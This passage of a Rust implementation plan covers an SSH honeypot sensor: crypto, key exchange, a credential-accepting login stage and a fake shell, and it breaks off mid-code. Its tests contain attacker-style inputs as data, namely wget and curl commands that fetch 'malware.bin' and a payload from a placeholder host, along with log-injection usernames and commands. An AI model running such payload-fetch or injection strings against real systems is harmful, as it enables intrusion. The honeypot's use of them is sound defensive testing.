```bash
git add crates/sensor-ssh/src/transport crates/sensor-ssh/tests/transport_test.rs crates/sensor-ssh/src/lib.rs
git commit -m "feat(sensor-ssh): SSH binary packet framing and version exchange"
```

---

### Task 10: Host key + crypto primitives

**Files:**
- Create: `crates/sensor-ssh/src/hostkey.rs`, `crates/sensor-ssh/src/transport/cipher.rs`, `crates/sensor-ssh/tests/crypto_test.rs`
- Modify: `crates/sensor-ssh/src/lib.rs` (add modules)

**Interfaces:**
- Consumes: `ed25519-dalek` (host key), `chacha20poly1305` (encryption), `rand` (key generation).
- Produces: `HostKey` (derives `Clone`): `HostKey::generate() -> Self`, `HostKey::load(path) -> Result<Self>`, `HostKey::save(&self, path) -> Result<()>`, `HostKey::public_key_blob(&self) -> Vec<u8>`, `HostKey::sign(&self, data: &[u8]) -> Vec<u8>`, `HostKey::verify(&self, data, sig_blob) -> bool`. `TransportCipher::new(main_key: &[u8; 32], header_key: &[u8; 32]) -> Self`, `TransportCipher::encrypt(&mut self, seq: u32, payload: &[u8]) -> Vec<u8>`, `TransportCipher::decrypt(&mut self, seq: u32, data: &[u8]) -> Result<Vec<u8>>`.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/tests/crypto_test.rs

#[test]
fn host_key_generate_save_load() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("host_key");
    let key = sensor_ssh::hostkey::HostKey::generate();
    key.save(&path).unwrap();
    let loaded = sensor_ssh::hostkey::HostKey::load(&path).unwrap();
    assert_eq!(key.public_key_blob(), loaded.public_key_blob());
}

#[test]
fn host_key_sign_and_verify() {
    let key = sensor_ssh::hostkey::HostKey::generate();
    let data = b"exchange hash data";
    let sig = key.sign(data);
    assert!(key.verify(data, &sig));
    assert!(!key.verify(b"wrong data", &sig));
}

#[test]
fn host_key_public_blob_ssh_format() {
    let key = sensor_ssh::hostkey::HostKey::generate();
    let blob = key.public_key_blob();
    // SSH public key blob format: string "ssh-ed25519" + string <32 bytes public key>
    // Verify the blob starts with the correct algorithm name.
    let algo_len = u32::from_be_bytes([blob[0], blob[1], blob[2], blob[3]]) as usize;
    let algo = std::str::from_utf8(&blob[4..4 + algo_len]).unwrap();
    assert_eq!(algo, "ssh-ed25519");
}

#[test]
fn chacha20poly1305_encrypt_decrypt_round_trip() {
    use sensor_ssh::transport::cipher::TransportCipher;
    // Use test keys (32 bytes each for main key and header key).
    let main_key = [0x42u8; 32];
    let header_key = [0x43u8; 32];
    let mut enc = TransportCipher::new(&main_key, &header_key);
    let mut dec = TransportCipher::new(&main_key, &header_key);
    let payload = b"hello encrypted ssh";
    let seq: u32 = 0;
    let encrypted = enc.encrypt(seq, payload);
    let decrypted = dec.decrypt(seq, &encrypted).unwrap();
    assert_eq!(decrypted, payload);
}

#[test]
fn chacha20poly1305_tampered_ciphertext_fails() {
    use sensor_ssh::transport::cipher::TransportCipher;
    let main_key = [0x42u8; 32];
    let header_key = [0x43u8; 32];
    let mut enc = TransportCipher::new(&main_key, &header_key);
    let mut dec = TransportCipher::new(&main_key, &header_key);
    let mut encrypted = enc.encrypt(0, b"test");
    // Flip a bit in the ciphertext.
    if let Some(byte) = encrypted.last_mut() { *byte ^= 1; }
    let result = dec.decrypt(0, &encrypted);
    assert!(result.is_err(), "tampered ciphertext must fail authentication");
}

#[test]
#[cfg(unix)]
fn host_key_file_permissions() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("host_key");
    let key = sensor_ssh::hostkey::HostKey::generate();
    key.save(&path).unwrap();
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600, "host key file must be 0600, got {mode:o}");
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test crypto_test`
Expected: FAIL - modules not defined.

- [ ] **Step 3: Write minimal implementation**

`hostkey.rs`:
```rust
use ed25519_dalek::{SigningKey, VerifyingKey, Signature, Signer, Verifier};
use rand::rngs::OsRng;
use std::path::Path;

pub struct HostKey {
    signing_key: SigningKey,
}

impl HostKey {
    pub fn generate() -> Self {
        Self { signing_key: SigningKey::generate(&mut OsRng) }
    }

    pub fn save(&self, path: &Path) -> std::io::Result<()> {
        std::fs::write(path, self.signing_key.to_bytes())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600))?;
        }
        Ok(())
    }

    pub fn load(path: &Path) -> std::io::Result<Self> {
        let bytes = std::fs::read(path)?;
        let key_bytes: [u8; 32] = bytes.try_into()
            .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "invalid key length"))?;
        Ok(Self { signing_key: SigningKey::from_bytes(&key_bytes) })
    }

    pub fn public_key_blob(&self) -> Vec<u8> {
        // SSH wire format: string "ssh-ed25519" + string <public key bytes>
        let vk = VerifyingKey::from(&self.signing_key);
        let algo = b"ssh-ed25519";
        let pk = vk.as_bytes();
        let mut blob = Vec::new();
        blob.extend_from_slice(&(algo.len() as u32).to_be_bytes());
        blob.extend_from_slice(algo);
        blob.extend_from_slice(&(pk.len() as u32).to_be_bytes());
        blob.extend_from_slice(pk);
        blob
    }

    pub fn sign(&self, data: &[u8]) -> Vec<u8> {
        // SSH signature format: string "ssh-ed25519" + string <signature bytes>
        let sig: Signature = self.signing_key.sign(data);
        let algo = b"ssh-ed25519";
        let sig_bytes = sig.to_bytes();
        let mut out = Vec::new();
        out.extend_from_slice(&(algo.len() as u32).to_be_bytes());
        out.extend_from_slice(algo);
        out.extend_from_slice(&(sig_bytes.len() as u32).to_be_bytes());
        out.extend_from_slice(&sig_bytes);
        out
    }

    pub fn verify(&self, data: &[u8], sig_blob: &[u8]) -> bool {
        // Parse the SSH signature blob to extract the raw signature bytes,
        // then verify with ed25519_dalek.
        let vk = VerifyingKey::from(&self.signing_key);
        // Skip the algorithm string, extract signature bytes.
        if sig_blob.len() < 4 { return false; }
        let algo_len = u32::from_be_bytes([sig_blob[0], sig_blob[1], sig_blob[2], sig_blob[3]]) as usize;
        let rest = &sig_blob[4 + algo_len..];
        if rest.len() < 4 { return false; }
        let sig_len = u32::from_be_bytes([rest[0], rest[1], rest[2], rest[3]]) as usize;
        let sig_bytes = &rest[4..4 + sig_len];
        let sig_arr: [u8; 64] = match sig_bytes.try_into() {
            Ok(a) => a,
            Err(_) => return false,
        };
        let signature = Signature::from_bytes(&sig_arr);
        vk.verify(data, &signature).is_ok()
    }
}
```

`transport/cipher.rs` - ChaCha20-Poly1305@openssh.com:

The OpenSSH variant uses two ChaCha20 instances per direction:
- **Header key** (last 32 bytes of the 64-byte encryption key): encrypts the 4-byte packet length.
- **Main key** (first 32 bytes): ChaCha20-Poly1305 AEAD on the payload (padding_length + payload + padding).
- **Nonce**: the 32-bit sequence number, zero-extended to 12 bytes (big-endian in the high 4 bytes, 8 zero bytes below for the standard OpenSSH encoding).
- **AAD for Poly1305**: the encrypted packet length (4 bytes).

Implement using `chacha20poly1305` crate's `ChaCha20Poly1305` for the AEAD and `chacha20::ChaCha20` for the header encryption. Check the `chacha20poly1305` crate's API for `encrypt_in_place_detached` / `decrypt_in_place_detached` to handle the AAD correctly.

**Important:** verify the nonce encoding against the OpenSSH source (`cipher-chachapoly-libcrypto.c`). The sequence number is a 64-bit counter; the nonce is `seqnr` as 8 big-endian bytes followed by 4 zero bytes (total 12). Check whether the crate expects the nonce in this order or reversed.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test crypto_test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-ssh/src/hostkey.rs crates/sensor-ssh/src/transport/cipher.rs crates/sensor-ssh/tests/crypto_test.rs crates/sensor-ssh/src/lib.rs
git commit -m "feat(sensor-ssh): ed25519 host key and ChaCha20-Poly1305 transport cipher"
```

---

### Task 11: Key exchange + encrypted channel

**Files:**
- Create: `crates/sensor-ssh/src/transport/kex.rs`, `crates/sensor-ssh/src/transport/keys.rs`
- Modify: `crates/sensor-ssh/src/transport/mod.rs` (integrate kex into transport)
- Test: added to `crates/sensor-ssh/tests/crypto_test.rs`

**Interfaces:**
- Consumes: `HostKey` (Task 10), `TransportCipher` (Task 10), packet framing (Task 9), `x25519-dalek`, `sha2`.
- Produces: `perform_kex_server(stream, host_key, ...) -> Result<SessionKeys>`, `SessionKeys` struct with fields `session_id: Vec<u8>`, `client_to_server_key: Vec<u8>`, `server_to_client_key: Vec<u8>`, and methods `client_to_server_cipher(&self) -> TransportCipher`, `server_to_client_cipher(&self) -> TransportCipher`. Also `derive_keys(shared_secret, exchange_hash, session_id) -> SessionKeys` (called internally by `perform_kex_server`). Client-side helpers `build_client_ecdh_init()` and `complete_kex_client()` for tests only. `read_packet_encrypted(stream, cipher, seq) -> Result<Vec<u8>>`, `write_packet_encrypted(stream, cipher, seq, payload) -> Result<()>`.

- [ ] **Step 1: Write the failing test**

```rust
// added to crates/sensor-ssh/tests/crypto_test.rs

#[tokio::test]
async fn key_exchange_completes_and_encrypted_channel_works() {
    use sensor_ssh::transport::kex::*;
    use sensor_ssh::transport::*;
    use sensor_ssh::hostkey::HostKey;

    let host_key = HostKey::generate();
    let (mut client_stream, mut server_stream) = tokio::io::duplex(8192);

    // Server side: perform key exchange.
    let server_task = tokio::spawn({
        let host_key = host_key.clone();
        async move {
            let server_kexinit = build_kexinit();
            write_packet_unencrypted(&mut server_stream, &server_kexinit).await.unwrap();
            let client_kexinit_pkt = read_packet_unencrypted(&mut server_stream).await.unwrap();
            let client_ecdh_init = read_packet_unencrypted(&mut server_stream).await.unwrap();
            let session_keys = perform_kex_server(
                &mut server_stream, &host_key,
                &client_kexinit_pkt.payload, &server_kexinit,
                "SSH-2.0-TestClient", "SSH-2.0-TestServer",
                &client_ecdh_init.payload,
            ).await.unwrap();
            // Read NEWKEYS from client.
            let _newkeys = read_packet_unencrypted(&mut server_stream).await.unwrap();
            // Send NEWKEYS.
            write_packet_unencrypted(&mut server_stream, &[SSH_MSG_NEWKEYS]).await.unwrap();
            (server_stream, session_keys)
        }
    });

    // Client side: minimal key exchange.
    let client_kexinit = build_kexinit();
    let _server_kexinit = read_packet_unencrypted(&mut client_stream).await.unwrap();
    write_packet_unencrypted(&mut client_stream, &client_kexinit).await.unwrap();
    let (client_ephemeral, client_ecdh_init) = build_client_ecdh_init();
    write_packet_unencrypted(&mut client_stream, &client_ecdh_init).await.unwrap();
    let ecdh_reply = read_packet_unencrypted(&mut client_stream).await.unwrap();
    let client_keys = complete_kex_client(
        &client_ephemeral, &ecdh_reply.payload,
        &client_kexinit, &_server_kexinit.payload,
        "SSH-2.0-TestClient", "SSH-2.0-TestServer",
    ).unwrap();
    write_packet_unencrypted(&mut client_stream, &[SSH_MSG_NEWKEYS]).await.unwrap();
    let _newkeys = read_packet_unencrypted(&mut client_stream).await.unwrap();

    let (mut server_stream, server_keys) = server_task.await.unwrap();

    // Verify both sides derived the same session keys.
    assert_eq!(client_keys.session_id, server_keys.session_id);

    // Test encrypted communication.
    let mut server_enc = server_keys.server_to_client_cipher();
    let mut client_dec = client_keys.server_to_client_cipher();
    let test_payload = vec![SSH_MSG_IGNORE, 0, 0, 0, 5, b'h', b'e', b'l', b'l', b'o'];
    write_packet_encrypted(&mut server_stream, &mut server_enc, 0, &test_payload).await.unwrap();
    let decrypted = read_packet_encrypted(&mut client_stream, &mut client_dec, 0).await.unwrap();
    assert_eq!(decrypted, test_payload);
}

#[test]
fn session_key_derivation_deterministic() {
    use sensor_ssh::transport::keys::derive_keys;
    let shared_secret = [0x42u8; 32];
    let exchange_hash = [0x43u8; 32];
    let session_id = exchange_hash;
    let keys1 = derive_keys(&shared_secret, &exchange_hash, &session_id);
    let keys2 = derive_keys(&shared_secret, &exchange_hash, &session_id);
    assert_eq!(keys1.client_to_server_key, keys2.client_to_server_key);
    assert_eq!(keys1.server_to_client_key, keys2.server_to_client_key);
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test crypto_test key_exchange`
Expected: FAIL - `kex` module not defined.

- [ ] **Step 3: Write minimal implementation**

`transport/kex.rs` - curve25519-sha256 key exchange (RFC 8731):

Server side (`perform_kex_server`):
1. Parse client's `SSH_MSG_KEX_ECDH_INIT` to extract `Q_C` (client's X25519 public key, 32 bytes).
2. Generate server's ephemeral X25519 keypair: `EphemeralSecret::random_from_rng(OsRng)` -> `Q_S`.
3. Compute shared secret `K = X25519(server_secret, Q_C)`.
4. Compute exchange hash `H = SHA-256(V_C || V_S || I_C || I_S || K_S || Q_C || Q_S || K)` where:
   - `V_C`, `V_S`: version strings (as SSH string: length-prefixed)
   - `I_C`, `I_S`: KEXINIT payloads (as SSH string: length-prefixed)
   - `K_S`: host key blob (as SSH string)
   - `Q_C`, `Q_S`: ephemeral public keys (as SSH string: 32 bytes each)
   - `K`: shared secret as SSH mpint (big-endian, MSB sign-extended)
5. Sign `H` with host key: `host_key.sign(H)`.
6. Build `SSH_MSG_KEX_ECDH_REPLY`: `K_S || Q_S || signature`.
7. Send the reply packet.
8. Return `SessionKeys` derived from `K` and `H`.

Client side (`build_client_ecdh_init`, `complete_kex_client`) - needed for tests:
- Mostly the mirror of the server side. The test acts as a minimal client.

`transport/keys.rs` - session key derivation (RFC 4253 section 7.2):
```rust
// For each key, compute: HASH(K || H || letter || session_id)
// where letter is 'A'..'F' for the six keys/IVs.
// If the key needs to be longer than one hash output, extend with
// HASH(K || H || K_n) where K_n is the key so far.
pub fn derive_keys(shared_secret: &[u8], exchange_hash: &[u8], session_id: &[u8]) -> SessionKeys {
    // 64 bytes per direction for chacha20-poly1305@openssh.com
    // (32 bytes main key + 32 bytes header key)
    let c2s_key = derive_one(shared_secret, exchange_hash, b'C', session_id, 64);
    let s2c_key = derive_one(shared_secret, exchange_hash, b'D', session_id, 64);
    SessionKeys {
        client_to_server_key: c2s_key,
        server_to_client_key: s2c_key,
        session_id: session_id.to_vec(),
    }
}

impl SessionKeys {
    pub fn client_to_server_cipher(&self) -> TransportCipher {
        TransportCipher::new(
            self.client_to_server_key[..32].try_into().unwrap(),
            self.client_to_server_key[32..].try_into().unwrap(),
        )
    }
    pub fn server_to_client_cipher(&self) -> TransportCipher {
        TransportCipher::new(
            self.server_to_client_key[..32].try_into().unwrap(),
            self.server_to_client_key[32..].try_into().unwrap(),
        )
    }
}
```

Update `transport/mod.rs` to add `read_packet_encrypted` and `write_packet_encrypted` that use `TransportCipher` from Task 10.

**Critical:** the shared secret `K` must be encoded as an SSH mpint (RFC 4251 section 5): big-endian, with a leading zero byte if the MSB is set (to avoid it being interpreted as negative). Verify this encoding carefully - a wrong mpint encoding produces a different exchange hash and the handshake silently fails.

**Critical:** for `chacha20-poly1305@openssh.com`, each direction uses a 64-byte key. The first 32 bytes are the main ChaCha20-Poly1305 key; the last 32 bytes are the header encryption key. Verify this split matches OpenSSH's implementation.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test crypto_test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-ssh/src/transport
git commit -m "feat(sensor-ssh): curve25519-sha256 key exchange and encrypted channel"
```

---

### Task 12: Authentication + channel setup + authenticated semantics

**Files:**
- Create: `crates/sensor-ssh/src/auth.rs`, `crates/sensor-ssh/src/channel.rs`
- Modify: `crates/sensor-ssh/src/lib.rs` (add modules)
- Test: `crates/sensor-ssh/tests/auth_test.rs`

**Interfaces:**
- Consumes: encrypted packet I/O (Task 11), `SensorEvent` from `sensor-wire`, `EventEmitter` from `sensor-framework`, `sanitize_value` from `sensor-framework`.
- Produces: `AuthState::new(source_ip, wan_ip) -> Self`, `AuthState::is_authenticated(&self) -> bool`, `AuthState::handle_userauth(&mut self, payload: &[u8]) -> Result<(Vec<u8>, Vec<SensorEvent>), AuthError>`, `AuthError` enum. `handle_channel_open(packet) -> Result<(u32, Vec<u8>)>`, `handle_channel_request(packet, channel_id) -> Result<ChannelAction>`, `ChannelAction` enum (`Shell`, `Exec(String)`, `Subsystem(String)`, `PtyReq`, `Other`).

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/tests/auth_test.rs

#[test]
fn authenticated_false_before_userauth() {
    let state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    assert!(!state.is_authenticated());
}

#[test]
fn authenticated_true_after_userauth_success() {
    let mut state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    let userauth_request = build_password_userauth(b"attacker", b"password123");
    let (response, events) = state.handle_userauth(&userauth_request).unwrap();
    assert!(state.is_authenticated());
    assert_eq!(response[0], sensor_ssh::transport::SSH_MSG_USERAUTH_SUCCESS);
    // Verify events emitted.
    assert_eq!(events.len(), 1);
    assert_eq!(events[0].signal_type, sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT);
    assert!(events[0].authenticated);
}

#[test]
fn password_never_in_event() {
    let mut state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    let password = b"s3cret_p@ssw0rd!";
    let userauth = build_password_userauth(b"root", password);
    let (_response, events) = state.handle_userauth(&userauth).unwrap();
    let event_json = serde_json::to_string(&events[0]).unwrap();
    assert!(
        !event_json.contains("s3cret_p@ssw0rd!"),
        "password must NEVER appear in event: {event_json}"
    );
}

#[test]
fn username_captured_in_metadata() {
    let mut state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    let userauth = build_password_userauth(b"admin", b"pass");
    let (_response, events) = state.handle_userauth(&userauth).unwrap();
    let username = events[0].metadata.get("username").and_then(|v| v.as_str());
    assert_eq!(username, Some("admin"));
}

#[test]
fn username_with_injection_is_sanitized() {
    let mut state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    let evil_name = b"root\r\n{\"v\":1,\"signal_type\":\"evil\"}";
    let userauth = build_password_userauth(evil_name, b"pass");
    let (_response, events) = state.handle_userauth(&userauth).unwrap();
    let username = events[0].metadata.get("username").and_then(|v| v.as_str()).unwrap();
    assert!(!username.contains('\n'));
    assert!(!username.contains('\r'));
}

#[test]
fn authenticated_latch_stays_true() {
    let mut state = sensor_ssh::auth::AuthState::new(
        "203.0.113.7".parse().unwrap(), Some("198.51.100.4".parse().unwrap()));
    let userauth = build_password_userauth(b"root", b"pass");
    state.handle_userauth(&userauth).unwrap();
    assert!(state.is_authenticated());
    // authenticated stays true for the rest of the session.
    assert!(state.is_authenticated());
}

fn build_password_userauth(username: &[u8], password: &[u8]) -> Vec<u8> {
    // SSH_MSG_USERAUTH_REQUEST format:
    // byte      SSH_MSG_USERAUTH_REQUEST (50)
    // string    user name
    // string    service name ("ssh-connection")
    // string    method name ("password")
    // boolean   FALSE (no old password)
    // string    plaintext password
    let mut buf = vec![sensor_ssh::transport::SSH_MSG_USERAUTH_REQUEST];
    push_ssh_string(&mut buf, username);
    push_ssh_string(&mut buf, b"ssh-connection");
    push_ssh_string(&mut buf, b"password");
    buf.push(0); // FALSE
    push_ssh_string(&mut buf, password);
    buf
}

fn push_ssh_string(buf: &mut Vec<u8>, data: &[u8]) {
    buf.extend_from_slice(&(data.len() as u32).to_be_bytes());
    buf.extend_from_slice(data);
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test auth_test`
Expected: FAIL - modules not defined.

- [ ] **Step 3: Write minimal implementation**

`auth.rs`:
```rust
use sensor_framework::sanitize_value;
use sensor_wire::*;

pub struct AuthState {
    authenticated: bool,
    username: Option<String>,
    source_ip: std::net::IpAddr,
    wan_ip: Option<std::net::IpAddr>,
}

#[derive(Debug)]
pub enum AuthError {
    MalformedPacket,
    Io(std::io::Error),
}

impl AuthState {
    pub fn new(source_ip: std::net::IpAddr, wan_ip: Option<std::net::IpAddr>) -> Self {
        Self { authenticated: false, username: None, source_ip, wan_ip }
    }

    pub fn is_authenticated(&self) -> bool {
        self.authenticated
    }

    pub fn handle_userauth(&mut self, payload: &[u8]) -> Result<(Vec<u8>, Vec<SensorEvent>), AuthError> {
        // Parse SSH_MSG_USERAUTH_REQUEST.
        // Extract username (sanitize), method, and if password method, the password.
        // The password is READ to advance the parser, then IMMEDIATELY DROPPED.
        // It is NEVER stored, logged, or placed in any event field.
        let (username_raw, _service, method, _password_ignored) = parse_userauth_request(payload)?;
        let username = sanitize_value(
            &String::from_utf8_lossy(&username_raw),
            255,
        );
        self.username = Some(username.clone());
        self.authenticated = true;

        let event = SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.source_ip,
            wan_ip: self.wan_ip,
            sensor: "ssh".into(),
            signal_type: SIGNAL_HONEYPOT_LOGIN_ATTEMPT.into(),
            protocol: PROTO_TCP.into(),
            authenticated: true,
            observed_at: chrono::Utc::now(),
            metadata: serde_json::json!({
                "protocol_label": "ssh",
                "username": username,
                "method": String::from_utf8_lossy(&method).to_string(),
            }),
            sample: None,
        };

        // Always accept.
        let response = vec![crate::transport::SSH_MSG_USERAUTH_SUCCESS];
        Ok((response, vec![event]))
    }
}
```

`parse_userauth_request(payload: &[u8]) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>, Vec<u8>), AuthError>`: parse the SSH_MSG_USERAUTH_REQUEST binary payload per RFC 4252 section 5. Returns (username, service_name, method, password_or_empty). The password is the return value's fourth element - the caller reads it to advance the parser, then drops it immediately. The test asserts the password string does not appear anywhere in the emitted event JSON.

`AuthState` also provides `emit_connection_event(&self) -> SensorEvent` which builds the `honeypot_connection` event with `authenticated = false`. This is called by the session orchestrator immediately after transport establishment (key exchange + NEWKEYS), before the service-request and userauth flow. The event uses the `source_ip` and `wan_ip` stored in `AuthState`.

```rust
pub fn emit_connection_event(&self) -> SensorEvent {
    SensorEvent {
        v: WIRE_VERSION,
        source_ip: self.source_ip,
        wan_ip: self.wan_ip,
        sensor: "ssh".into(),
        signal_type: SIGNAL_HONEYPOT_CONNECTION.into(),
        protocol: PROTO_TCP.into(),
        authenticated: false,
        observed_at: chrono::Utc::now(),
        metadata: serde_json::json!({ "protocol_label": "ssh" }),
        sample: None,
    }
}
```

`channel.rs`: handle `SSH_MSG_CHANNEL_OPEN` (allocate a channel ID, return `SSH_MSG_CHANNEL_OPEN_CONFIRMATION`), `SSH_MSG_CHANNEL_REQUEST` (dispatch `pty-req` -> acknowledge, `shell` -> start shell, `exec` -> capture command, `subsystem` -> dispatch SFTP). Return `ChannelAction` so the caller knows what to do next.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test auth_test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-ssh/src/auth.rs crates/sensor-ssh/src/channel.rs crates/sensor-ssh/tests/auth_test.rs
git commit -m "feat(sensor-ssh): authentication state machine with password drop and latch semantics"
```

---

### Task 13: Fake shell + fake filesystem + never-exec + no-outbound-fetch

**Files:**
- Create: `crates/sensor-ssh/src/shell.rs`, `crates/sensor-ssh/src/fakefs.rs`
- Test: `crates/sensor-ssh/tests/shell_test.rs`

**Interfaces:**
- Consumes: `sanitize_value` from `sensor-framework`, `SensorEvent` from `sensor-wire`, channel data I/O (Task 12).
- Produces: `FakeFs::new() -> Self`, `FakeFs::read_file(path) -> Option<String>`, `FakeFs::list_dir(path) -> Option<Vec<String>>`, `FakeShell::new(fs, emitter_ctx) -> Self`, `FakeShell::handle_input(line: &str) -> (String, Vec<SensorEvent>)`.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/tests/shell_test.rs

#[test]
fn command_captured_as_event() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("uname -a");
    assert!(!output.is_empty(), "must produce canned output");
    assert_eq!(events.len(), 1);
    assert_eq!(events[0].signal_type, sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC);
    assert!(events[0].authenticated);
    let cmd = events[0].metadata.get("command").and_then(|v| v.as_str());
    assert_eq!(cmd, Some("uname -a"));
}

#[test]
fn wget_produces_canned_output_no_network() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("wget http://203.0.113.99/malware.bin");
    assert!(output.contains("Connecting to") || output.contains("saved"),
        "wget must produce plausible canned output");
    assert_eq!(events.len(), 1);
    let cmd = events[0].metadata.get("command").and_then(|v| v.as_str()).unwrap();
    assert!(cmd.contains("wget"));
}

#[test]
fn curl_produces_canned_output_no_network() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("curl http://203.0.113.99/payload");
    assert!(!output.is_empty());
}

#[test]
fn command_with_injection_is_sanitized() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let evil_cmd = "ls\r\n{\"v\":1,\"signal_type\":\"forged\"}";
    let (_output, events) = shell.handle_input(evil_cmd);
    let cmd = events[0].metadata.get("command").and_then(|v| v.as_str()).unwrap();
    assert!(!cmd.contains('\n'), "newline must be sanitized");
    assert!(!cmd.contains('\r'));
}

#[test]
fn fakefs_common_paths_exist() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    assert!(fs.read_file("/etc/hostname").is_some());
    assert!(fs.list_dir("/").is_some());
    assert!(fs.list_dir("/tmp").is_some());
}

#[test]
fn fakefs_uses_rfc5737_addresses() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    // Any IP addresses in canned content must be RFC5737/RFC1918.
    if let Some(content) = fs.read_file("/etc/hosts") {
        // Should not contain real public IPs.
        assert!(!content.contains("8.8.8.8"));
        assert!(!content.contains("1.1.1.1"));
    }
}

#[test]
fn never_exec_static_check() {
    // Verify that sensor-ssh source does not import process-spawning facilities.
    let src_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut found_exec = Vec::new();
    for entry in walkdir_or_manual(&src_dir) {
        let content = std::fs::read_to_string(&entry).unwrap_or_default();
        if content.contains("std::process::Command")
            || content.contains("process::Command")
            || content.contains("Command::new")
            || content.contains("std::process::exit")  // exit is fine, but exec is not
            || content.contains("libc::exec")
            || content.contains("nix::unistd::exec")
        {
            found_exec.push(entry.display().to_string());
        }
    }
    assert!(found_exec.is_empty(),
        "sensor-ssh must not contain process-spawning code: {found_exec:?}");
}

fn test_emit_ctx() -> sensor_ssh::shell::EmitContext {
    sensor_ssh::shell::EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: Some("198.51.100.4".parse().unwrap()),
        authenticated: true,
    }
}

fn walkdir_or_manual(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    fn walk(dir: &std::path::Path, files: &mut Vec<std::path::PathBuf>) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, files);
                } else if path.extension().is_some_and(|e| e == "rs") {
                    files.push(path);
                }
            }
        }
    }
    walk(dir, &mut files);
    files
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test shell_test`
Expected: FAIL - modules not defined.

- [ ] **Step 3: Write minimal implementation**

`fakefs.rs`:
```rust
use std::collections::HashMap;

pub struct FakeFs {
    files: HashMap<String, String>,
    dirs: HashMap<String, Vec<String>>,
}

impl FakeFs {
    pub fn new() -> Self {
        let mut fs = Self { files: HashMap::new(), dirs: HashMap::new() };
        // Populate with common paths. All IPs use RFC5737/RFC1918 ranges.
        fs.files.insert("/etc/hostname".into(), "server01\n".into());
        fs.files.insert("/etc/passwd".into(),
            "root:x:0:0:root:/root:/bin/bash\n\
             daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
             sshd:x:74:74:sshd:/var/run/sshd:/usr/sbin/nologin\n".into());
        fs.files.insert("/proc/version".into(),
            "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-051) \
             (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0) #101-Ubuntu SMP\n".into());
        // ... more files populated here (kept concise for the plan).
        fs.dirs.insert("/".into(), vec![
            "bin", "etc", "home", "proc", "root", "tmp", "usr", "var",
        ].into_iter().map(String::from).collect());
        fs.dirs.insert("/tmp".into(), vec![]);
        // ... more directories.
        fs
    }

    pub fn read_file(&self, path: &str) -> Option<String> {
        self.files.get(path).cloned()
    }

    pub fn list_dir(&self, path: &str) -> Option<Vec<String>> {
        self.dirs.get(path).cloned()
    }
}
```

`shell.rs`:
```rust
use sensor_framework::sanitize_value;
use sensor_wire::*;
use crate::fakefs::FakeFs;

pub struct EmitContext {
    pub source_ip: std::net::IpAddr,
    pub wan_ip: Option<std::net::IpAddr>,
    pub authenticated: bool,
}

pub struct FakeShell {
    fs: FakeFs,
    ctx: EmitContext,
    cwd: String,
}

impl FakeShell {
    pub fn new(fs: FakeFs, ctx: EmitContext) -> Self {
        Self { fs, ctx, cwd: "/root".into() }
    }

    pub fn handle_input(&mut self, line: &str) -> (String, Vec<SensorEvent>) {
        let sanitized_cmd = sanitize_value(line, 1024);
        let event = SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.ctx.source_ip,
            wan_ip: self.ctx.wan_ip,
            sensor: "ssh".into(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
